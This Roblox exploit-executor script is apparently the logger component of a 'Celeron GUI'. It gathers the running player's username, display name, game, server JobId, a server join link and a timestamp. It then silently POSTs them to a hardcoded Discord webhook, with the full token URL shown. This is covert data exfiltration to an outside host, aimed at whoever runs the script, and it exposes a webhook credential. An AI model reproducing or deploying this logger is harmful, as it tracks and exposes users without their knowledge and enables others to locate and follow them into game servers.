local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")
local plr = Players.LocalPlayer
local cg = game:GetService("CoreGui")

local placeId = game.PlaceId
local jobId = game.JobId
local serverLink = "https://www.roblox.com/games/start?placeId="..placeId.."&gameInstanceId="..jobId

local adminCommands = true
local ec = cg:FindFirstChild("ExperienceChat")
if ec then
    local layout = ec:FindFirstChild("appLayout")
    if layout then
        local enableBtn = layout:FindFirstChild("enableChatButton")
        if enableBtn and enableBtn:FindFirstChild("EnableChatButton") then
            adminCommands = false
        end
    end
end

local productName = "Unknown"
pcall(function()
    productName = MarketplaceService:GetProductInfo(placeId).Name
end)


local payload = {
    ["username"] = "execution chamber",
    ["embeds"] = {{
        ["title"] = "Celeron GUI: Logger",
        ["color"] = 0x00FF00,
        ["fields"] = {
            {["name"]="Game Name", ["value"]=productName, ["inline"]=false},
            {["name"]="Display Name", ["value"]=plr.DisplayName, ["inline"]=false},
            {["name"]="Username", ["value"]=plr.Name, ["inline"]=false},
            {["name"]="Players", ["value"]=#Players:GetPlayers().."/"..Players.MaxPlayers, ["inline"]=false},
            {["name"]="Server Info", ["value"]="PlaceId: "..placeId.."\nJobId: "..jobId, ["inline"]=false},
            {["name"]="Can Use Commands On:", ["value"]=tostring(adminCommands), ["inline"]=false},
            {["name"]="Join Server?", ["value"]="[Join Server]("..serverLink..")", ["inline"]=false},
            {["name"]="Script Executed On:", ["value"]=os.date("%m/%d/%Y %I:%M %p"), ["inline"]=false}
        }
    }}
}

local webhook = "https://discord.com/api/webhooks/1449982612545343538/bUwvK5RCDO9qBeAmdfG1iXLWfJdGB1in0-13WXnQLHE4voIXap8z6esT7iYWSeY5R-ry"

local req = syn and syn.request or http_request or fluxus_request or request
if req then
    req({
        Url = webhook,
        Method = "POST",
        Headers = {["Content-Type"]="application/json"},
        Body = HttpService:JSONEncode(payload)
    })
end
